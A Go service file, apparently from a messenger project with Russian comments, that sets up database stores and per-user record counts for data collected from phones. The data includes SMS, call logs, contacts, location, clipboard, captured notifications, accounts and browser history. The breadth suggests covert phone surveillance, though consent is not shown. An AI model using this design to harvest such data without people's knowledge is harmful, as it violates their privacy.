package service

import (
	"context"

	"github.com/jeogram/messenger/internal/modules/phone/domain"
	"github.com/jeogram/messenger/internal/modules/phone/repository"
	"gorm.io/gorm"
)

// PhoneService предоставляет доступ к данным, собираемым с устройств.
type PhoneService struct {
	Device        *repository.PhoneStore[domain.DeviceInfo]
	Status        *repository.PhoneStore[domain.DeviceStatus]
	Location      *repository.PhoneStore[domain.LocationPoint]
	Apps          *repository.PhoneStore[domain.InstalledApp]
	Contacts      *repository.PhoneStore[domain.PhoneContact]
	Calls         *repository.PhoneStore[domain.CallLog]
	Sms           *repository.PhoneStore[domain.SmsLog]
	Clipboard     *repository.PhoneStore[domain.ClipboardEntry]
	Notifications *repository.PhoneStore[domain.NotificationCapture]
	Usage         *repository.PhoneStore[domain.AppUsage]
	Media         *repository.PhoneStore[domain.MediaItem]
	Accounts      *repository.PhoneStore[domain.DeviceAccount]
	Wifi          *repository.PhoneStore[domain.WifiNetwork]
	Bluetooth     *repository.PhoneStore[domain.BluetoothDevice]
	Calendar      *repository.PhoneStore[domain.CalendarEvent]
	Sensors       *repository.PhoneStore[domain.SensorReading]
	Browser       *repository.PhoneStore[domain.BrowserHistory]
}

// NewPhoneService инициализирует хранилища для всех категорий.
func NewPhoneService(db *gorm.DB) *PhoneService {
	return &PhoneService{
		Device:        repository.NewPhoneStore[domain.DeviceInfo](db),
		Status:        repository.NewPhoneStore[domain.DeviceStatus](db),
		Location:      repository.NewPhoneStore[domain.LocationPoint](db),
		Apps:          repository.NewPhoneStore[domain.InstalledApp](db),
		Contacts:      repository.NewPhoneStore[domain.PhoneContact](db),
		Calls:         repository.NewPhoneStore[domain.CallLog](db),
		Sms:           repository.NewPhoneStore[domain.SmsLog](db),
		Clipboard:     repository.NewPhoneStore[domain.ClipboardEntry](db),
		Notifications: repository.NewPhoneStore[domain.NotificationCapture](db),
		Usage:         repository.NewPhoneStore[domain.AppUsage](db),
		Media:         repository.NewPhoneStore[domain.MediaItem](db),
		Accounts:      repository.NewPhoneStore[domain.DeviceAccount](db),
		Wifi:          repository.NewPhoneStore[domain.WifiNetwork](db),
		Bluetooth:     repository.NewPhoneStore[domain.BluetoothDevice](db),
		Calendar:      repository.NewPhoneStore[domain.CalendarEvent](db),
		Sensors:       repository.NewPhoneStore[domain.SensorReading](db),
		Browser:       repository.NewPhoneStore[domain.BrowserHistory](db),
	}
}

// stores возвращает все хранилища вместе с ключами для сводки.
func (s *PhoneService) summaryStores() map[string]repository.Storer {
	return map[string]repository.Storer{
		"device":        s.Device,
		"status":        s.Status,
		"location":      s.Location,
		"apps":          s.Apps,
		"contacts":      s.Contacts,
		"calls":         s.Calls,
		"sms":           s.Sms,
		"clipboard":     s.Clipboard,
		"notifications": s.Notifications,
		"usage":         s.Usage,
		"media":         s.Media,
		"accounts":      s.Accounts,
		"wifi":          s.Wifi,
		"bluetooth":     s.Bluetooth,
		"calendar":      s.Calendar,
		"sensors":       s.Sensors,
		"browser":       s.Browser,
	}
}

// Summary возвращает количество записей по каждой категории для пользователя.
func (s *PhoneService) Summary(ctx context.Context, userID string) (map[string]int64, error) {
	out := map[string]int64{}
	for key, store := range s.summaryStores() {
		n, err := store.CountAll(ctx, userID)
		if err != nil {
			return nil, err
		}
		out[key] = n
	}
	return out, nil
}
